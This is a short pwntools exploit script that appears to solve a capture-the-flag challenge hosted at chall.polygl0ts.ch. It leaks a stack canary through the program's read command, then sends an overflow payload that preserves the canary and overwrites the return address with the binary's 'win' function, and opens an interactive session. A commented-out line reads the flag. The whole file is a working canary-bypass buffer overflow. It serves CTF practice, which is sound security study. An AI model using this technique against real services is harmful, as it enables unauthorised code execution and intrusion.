from pwn import *

# r = process("stdbuf -i0 -o0 remote_files/exe", shell=True)
# r = gdb.debug("remote_files/exe")
r = remote("chall.polygl0ts.ch", 6100)
a = ELF("remote_files/exe")

context.log_level = 0

r.recvuntil(b"command")
r.sendline(b"0")
r.recvuntil(b"read: ")
r.sendline(b"11")
canary = r.recv(8)
print("Canary, ", canary)
r.sendline("1 112")
r.send(b'a'*(8*11) + canary + b'a'*8 + p64(a.symbols["win"]))
r.sendline("2")
# r.sendline("cat flag")

r.interactive()
